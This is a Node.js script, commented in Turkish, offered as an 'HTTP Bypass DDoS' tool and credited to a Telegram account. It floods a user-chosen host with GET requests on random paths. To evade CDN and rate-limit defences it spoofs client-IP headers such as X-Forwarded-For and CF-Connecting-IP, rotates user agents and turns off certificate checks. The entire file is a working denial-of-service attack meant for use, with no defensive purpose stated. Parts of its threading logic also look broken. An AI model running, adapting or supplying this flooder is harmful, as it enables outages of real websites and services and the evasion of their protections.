#!/usr/bin/env node
/**
 * HTTP Bypass DDoS - JavaScript (Node.js)
 * Telegram: https://t.me/Zeldyy_here
 * 
 * Kullanım: node dos.js <hedef> <port> <thread>
 * Örnek: node dos.js example.com 80 500
 */

const http = require('http');
const https = require('https');
const net = require('net');
const { URL } = require('url');
const readline = require('readline');

// ============================================================
// RENKLER (Terminal için)
// ============================================================
const colors = {
    reset: '\x1b[0m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    lightred: '\x1b[91m',
    lightgreen: '\x1b[92m',
    lightyellow: '\x1b[93m',
    lightcyan: '\x1b[96m'
};

// ============================================================
// LOGO VE BAŞLIK
// ============================================================
const logo = `
${colors.cyan}╔═══════════════════════════════════════════════╗
║         HTTP BYPASS DDoS - JavaScript         ║
║         Telegram: @Zeldyy_here                ║
╚═══════════════════════════════════════════════╝${colors.reset}`;

console.log(logo);

// ============================================================
// PARAMETRELER
// ============================================================
const args = process.argv.slice(2);

let target = args[0] || null;
let port = parseInt(args[1]) || 80;
let threadCount = parseInt(args[2]) || 100;

// Eğer parametre yoksa kullanıcıdan iste
if (!target) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    rl.question(`${colors.yellow}Hedef (IP veya Domain): ${colors.reset}`, (answer) => {
        target = answer.trim();
        if (!target) {
            console.log(`${colors.red}Hedef girmedin!${colors.reset}`);
            process.exit(1);
        }
        rl.question(`${colors.yellow}Port (varsayılan 80): ${colors.reset}`, (portAnswer) => {
            port = parseInt(portAnswer) || 80;
            rl.question(`${colors.yellow}Thread sayısı (varsayılan 100): ${colors.reset}`, (threadAnswer) => {
                threadCount = parseInt(threadAnswer) || 100;
                rl.close();
                baslat(target, port, threadCount);
            });
        });
    });
} else {
    baslat(target, port, threadCount);
}

// ============================================================
// SALDIRI FONKSİYONU
// ============================================================
function baslat(target, port, threadCount) {
    // Hedefi temizle
    let hedef = target.replace(/^https?:\/\//, '').split('/')[0];
    let isSSL = port === 443;
    let paketSayisi = 0;
    let aktif = true;
    let baslangic = Date.now();
    
    console.log(`${colors.green}[+] Hedef: ${hedef}:${port}`);
    console.log(`${colors.green}[+] Thread: ${threadCount}`);
    console.log(`${colors.green}[+] SSL: ${isSSL ? 'Evet (443)' : 'Hayır (80)'}`);
    console.log(`${colors.yellow}[*] Saldırı başladı! CTRL+C ile durdur.${colors.reset}\n`);
    
    // Fake IP listesi
    const fakeIPs = [];
    for (let i = 0; i < 500; i++) {
        fakeIPs.push(`${rand(1,255)}.${rand(1,255)}.${rand(1,255)}.${rand(1,255)}`);
    }
    
    // User-Agent listesi
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0)',
        'Mozilla/5.0 (Android 14; Mobile) AppleWebKit/537.36'
    ];
    
    // Rastgele sayı
    function rand(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    
    // Rastgele path
    function rastgelePath() {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let path = '';
        for (let i = 0; i < rand(5, 15); i++) {
            path += chars[rand(0, chars.length - 1)];
        }
        return '/' + path;
    }
    
    // ===== HTTP BYPASS SALDIRISI =====
    function httpBypass() {
        if (!aktif) return;
        
        try {
            const fakeIP = fakeIPs[rand(0, fakeIPs.length - 1)];
            const ua = userAgents[rand(0, userAgents.length - 1)];
            const path = rastgelePath();
            
            const payload = `GET ${path} HTTP/1.1\r\n` +
                `Host: ${hedef}\r\n` +
                `User-Agent: ${ua}\r\n` +
                `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
                `Accept-Language: tr-TR,tr;q=0.9,en;q=0.8\r\n` +
                `Accept-Encoding: gzip, deflate, br\r\n` +
                `Cache-Control: no-cache\r\n` +
                `Pragma: no-cache\r\n` +
                `X-Forwarded-For: ${fakeIP}\r\n` +
                `X-Real-IP: ${fakeIP}\r\n` +
                `CF-Connecting-IP: ${fakeIP}\r\n` +
                `X-Originating-IP: ${fakeIP}\r\n` +
                `X-Client-IP: ${fakeIP}\r\n` +
                `True-Client-IP: ${fakeIP}\r\n` +
                `Connection: keep-alive\r\n\r\n`;
            
            const client = isSSL ? https : http;
            const options = {
                hostname: hedef,
                port: port,
                path: path,
                method: 'GET',
                headers: {
                    'Host': hedef,
                    'User-Agent': ua,
                    'X-Forwarded-For': fakeIP,
                    'X-Real-IP': fakeIP,
                    'CF-Connecting-IP': fakeIP,
                    'Connection': 'keep-alive'
                }
            };
            
            const req = client.request(options, (res) => {
                // Yanıtı okuma, sadece bağlantıyı açık tut
                res.on('data', () => {});
            });
            
            req.on('error', () => {});
            req.setTimeout(1000, () => {
                req.destroy();
            });
            
            // Birden fazla istek gönder
            for (let i = 0; i < 3; i++) {
                req.write(payload);
            }
            req.end();
            
            paketSayisi += 3;
        } catch (e) {
            // Hata yoksay
        }
    }
    
    // ===== SSL BYPASS =====
    function sslBypass() {
        if (!aktif || !isSSL) return;
        
        try {
            const fakeIP = fakeIPs[rand(0, fakeIPs.length - 1)];
            const ua = userAgents[rand(0, userAgents.length - 1)];
            const path = rastgelePath();
            
            const options = {
                hostname: hedef,
                port: port,
                path: path,
                method: 'GET',
                headers: {
                    'Host': hedef,
                    'User-Agent': ua,
                    'X-Forwarded-For': fakeIP,
                    'X-Real-IP': fakeIP,
                    'CF-Connecting-IP': fakeIP,
                    'Connection': 'keep-alive'
                },
                rejectUnauthorized: false
            };
            
            const req = https.request(options, (res) => {
                res.on('data', () => {});
            });
            
            req.on('error', () => {});
            req.setTimeout(1000, () => {
                req.destroy();
            });
            
            for (let i = 0; i < 3; i++) {
                req.write(`GET ${path} HTTP/1.1\r\nHost: ${hedef}\r\nUser-Agent: ${ua}\r\nX-Forwarded-For: ${fakeIP}\r\n\r\n`);
            }
            req.end();
            
            paketSayisi += 3;
        } catch (e) {}
    }
    
    // ===== THREAD =====
    function thread() {
        while (aktif) {
            if (isSSL && Math.random() < 0.3) {
                sslBypass();
            } else {
                httpBypass();
            }
            // Hafif bekleme
            let delay = Math.random() * 2;
            setTimeout(() => {}, delay);
        }
    }
    
    // Thread'leri başlat
    for (let i = 0; i < threadCount; i++) {
        setTimeout(thread, i * 1);
    }
    
    // Durum göster
    setInterval(() => {
        let gecen = (Date.now() - baslangic) / 1000;
        let pps = gecen > 0 ? Math.floor(paketSayisi / gecen) : 0;
        console.log(`${colors.cyan}[+] ${paketSayisi.toLocaleString()} paket | PPS: ${pps.toLocaleString()} | ${gecen.toFixed(0)}s${colors.reset}`);
    }, 5000);
    
    // CTRL+C ile durdur
    process.on('SIGINT', () => {
        console.log(`\n${colors.red}[!] Durduruldu.${colors.reset}`);
        aktif = false;
        process.exit(0);
    });
  }
